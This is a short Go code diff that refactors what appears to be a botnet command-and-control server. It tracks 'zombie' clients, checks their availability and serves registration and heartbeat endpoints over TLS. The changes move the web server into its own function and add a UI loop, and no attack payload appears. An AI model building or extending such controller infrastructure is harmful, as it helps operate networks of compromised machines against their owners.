@@ -4,7 +4,6 @@ import (
 	"database/sql"
 	"flag"
 	"log"
-	"net/http"
 	"strconv"
 	"sync"
 	"time"
@@ -24,7 +23,7 @@ const PORT = ":443"
 const MAX_AVAILABILITY_TIME = 60 //in sec
 const CHECKING_DELAY = 10        // in sec
 
-func checkZombiesAvailability(db sql.DB) {
+func checkZombiesAvailability(db *sql.DB) {
 	logPrefix := "[ZMBICHECK] "
 	for {
 		removedClientNbr := 0
@@ -86,9 +85,6 @@ func main() {
 	verbose = flag.Bool("v", false, "Enable verbosity")
 	flag.BoolVar(verbose, "verbose", false, "Enable verbosity")
 	flag.Parse()
-	if *verbose {
-		Log(l, "[ARGS] Verbosity enabled")
-	}
 	db, dBerr := InitDb()
 	if dBerr != nil {
 		Error(l, "Error while starting DB: "+dBerr.Error())
@@ -96,21 +92,18 @@ func main() {
 
 	defer db.Close()
 
-	InitCommands()
-	go checkZombiesAvailability(*db)
-	go UserInput(reader, db)
-	// TODO: GOROUTINE TO CHECK SIDs EXPIRATIONS AND PROCESS THEM
-	http.HandleFunc("/helloworld", HelloWorld)
-	http.HandleFunc("/getSID", GetSID)
-	http.HandleFunc("/register", Register(*db))
-	http.HandleFunc("/heartBeat", HeartBeat(*db))
-	DbgMsgEx(l, "Starting the webserver on "+PORT, true)
+	go func() {
+		
+		if *verbose {
+			Log(l, "[ARGS] Verbosity enabled")
+		}
 
-	err := http.ListenAndServeTLS(PORT, "certs/server.crt", "certs/server.key", nil)
-	if err != nil {
-		log.Fatal("ListenAndServe: ", err)
-	}
-
-	defer DbgMsg(l, "Stopping the webserver...")
+		InitCommands()
+		go checkZombiesAvailability(db)
+		//go UserInput(reader, db)
+		// TODO: GOROUTINE TO CHECK SIDs EXPIRATIONS AND PROCESS THEM
+		go StartWebServer(db)
+	}()
+	StartUI(db)
 
 }
